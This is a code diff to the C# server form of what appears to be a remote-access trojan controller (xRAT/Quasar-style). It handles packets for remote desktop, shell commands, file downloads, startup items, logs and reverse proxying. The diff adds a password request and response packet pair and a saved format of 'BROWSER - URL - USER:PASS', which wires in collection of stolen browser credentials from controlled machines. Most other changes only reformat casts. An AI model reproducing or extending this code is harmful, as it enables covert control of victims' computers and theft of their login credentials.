@@ -31,6 +31,7 @@ namespace xServer.Forms
             XMLSettings.AutoListen = bool.Parse(XMLSettings.ReadValue("AutoListen"));
             XMLSettings.ShowPopup = bool.Parse(XMLSettings.ReadValue("ShowPopup"));
             XMLSettings.UseUPnP = bool.Parse(XMLSettings.ReadValue("UseUPnP"));
+            XMLSettings.SaveFormat = XMLSettings.ReadValueSafe("SaveFormat", "BROWSER - URL - USER:PASS");
 
             XMLSettings.ShowToolTip = bool.Parse(XMLSettings.ReadValueSafe("ShowToolTip", "False"));
             XMLSettings.IntegrateNoIP = bool.Parse(XMLSettings.ReadValueSafe("EnableNoIPUpdater", "False"));
@@ -134,7 +135,9 @@ namespace xServer.Forms
                 typeof (Core.Packets.ServerPackets.RemoveStartupItem),
                 typeof (Core.Packets.ServerPackets.DownloadFileCanceled),
                 typeof (Core.Packets.ServerPackets.GetLogs),
+                typeof (Core.Packets.ServerPackets.PasswordRequest),
                 typeof (Core.Packets.ClientPackets.Initialize),
+                typeof (Core.Packets.ClientPackets.PasswordResponse),
                 typeof (Core.Packets.ClientPackets.Status),
                 typeof (Core.Packets.ClientPackets.UserStatus),
                 typeof (Core.Packets.ClientPackets.DesktopResponse),
@@ -248,54 +251,58 @@ namespace xServer.Forms
             {
                 CommandHandler.HandleStatus(client, (Core.Packets.ClientPackets.Status) packet);
             }
-            else if (type == typeof (Core.Packets.ClientPackets.UserStatus))
+            else if (type == typeof(Core.Packets.ClientPackets.PasswordResponse))
             {
-                CommandHandler.HandleUserStatus(client, (Core.Packets.ClientPackets.UserStatus) packet);
+                CommandHandler.HandlePasswordResponse(client, (Core.Packets.ClientPackets.PasswordResponse)packet);
             }
-            else if (type == typeof (Core.Packets.ClientPackets.DesktopResponse))
+            else if (type == typeof(Core.Packets.ClientPackets.UserStatus))
             {
-                CommandHandler.HandleRemoteDesktopResponse(client, (Core.Packets.ClientPackets.DesktopResponse) packet);
+                CommandHandler.HandleUserStatus(client, (Core.Packets.ClientPackets.UserStatus)packet);
             }
-            else if (type == typeof (Core.Packets.ClientPackets.GetProcessesResponse))
+            else if (type == typeof(Core.Packets.ClientPackets.DesktopResponse))
+            {
+                CommandHandler.HandleRemoteDesktopResponse(client, (Core.Packets.ClientPackets.DesktopResponse)packet);
+            }
+            else if (type == typeof(Core.Packets.ClientPackets.GetProcessesResponse))
             {
                 CommandHandler.HandleGetProcessesResponse(client,
-                    (Core.Packets.ClientPackets.GetProcessesResponse) packet);
+                    (Core.Packets.ClientPackets.GetProcessesResponse)packet);
             }
-            else if (type == typeof (Core.Packets.ClientPackets.DrivesResponse))
+            else if (type == typeof(Core.Packets.ClientPackets.DrivesResponse))
             {
-                CommandHandler.HandleDrivesResponse(client, (Core.Packets.ClientPackets.DrivesResponse) packet);
+                CommandHandler.HandleDrivesResponse(client, (Core.Packets.ClientPackets.DrivesResponse)packet);
             }
-            else if (type == typeof (Core.Packets.ClientPackets.DirectoryResponse))
+            else if (type == typeof(Core.Packets.ClientPackets.DirectoryResponse))
             {
-                CommandHandler.HandleDirectoryResponse(client, (Core.Packets.ClientPackets.DirectoryResponse) packet);
+                CommandHandler.HandleDirectoryResponse(client, (Core.Packets.ClientPackets.DirectoryResponse)packet);
             }
-            else if (type == typeof (Core.Packets.ClientPackets.DownloadFileResponse))
+            else if (type == typeof(Core.Packets.ClientPackets.DownloadFileResponse))
             {
                 CommandHandler.HandleDownloadFileResponse(client,
-                    (Core.Packets.ClientPackets.DownloadFileResponse) packet);
+                    (Core.Packets.ClientPackets.DownloadFileResponse)packet);
             }
-            else if (type == typeof (Core.Packets.ClientPackets.GetSystemInfoResponse))
+            else if (type == typeof(Core.Packets.ClientPackets.GetSystemInfoResponse))
             {
                 CommandHandler.HandleGetSystemInfoResponse(client,
-                    (Core.Packets.ClientPackets.GetSystemInfoResponse) packet);
+                    (Core.Packets.ClientPackets.GetSystemInfoResponse)packet);
             }
-            else if (type == typeof (Core.Packets.ClientPackets.MonitorsResponse))
+            else if (type == typeof(Core.Packets.ClientPackets.MonitorsResponse))
             {
-                CommandHandler.HandleMonitorsResponse(client, (Core.Packets.ClientPackets.MonitorsResponse) packet);
+                CommandHandler.HandleMonitorsResponse(client, (Core.Packets.ClientPackets.MonitorsResponse)packet);
             }
-            else if (type == typeof (Core.Packets.ClientPackets.ShellCommandResponse))
+            else if (type == typeof(Core.Packets.ClientPackets.ShellCommandResponse))
             {
                 CommandHandler.HandleShellCommandResponse(client,
-                    (Core.Packets.ClientPackets.ShellCommandResponse) packet);
+                    (Core.Packets.ClientPackets.ShellCommandResponse)packet);
             }
-            else if (type == typeof (Core.Packets.ClientPackets.GetStartupItemsResponse))
+            else if (type == typeof(Core.Packets.ClientPackets.GetStartupItemsResponse))
             {
-                CommandHandler.HandleGetStartupItemsResponse(client, 
-                    (Core.Packets.ClientPackets.GetStartupItemsResponse) packet);
+                CommandHandler.HandleGetStartupItemsResponse(client,
+                    (Core.Packets.ClientPackets.GetStartupItemsResponse)packet);
             }
             else if (type == typeof(Core.Packets.ClientPackets.GetLogsResponse))
             {
-                CommandHandler.HandleGetLogsResponse(client, (Core.Packets.ClientPackets.GetLogsResponse) packet);
+                CommandHandler.HandleGetLogsResponse(client, (Core.Packets.ClientPackets.GetLogsResponse)packet);
             }
             else if (type == typeof(Core.ReverseProxy.Packets.ReverseProxyConnectResponse) ||
                     type == typeof(Core.ReverseProxy.Packets.ReverseProxyData) ||
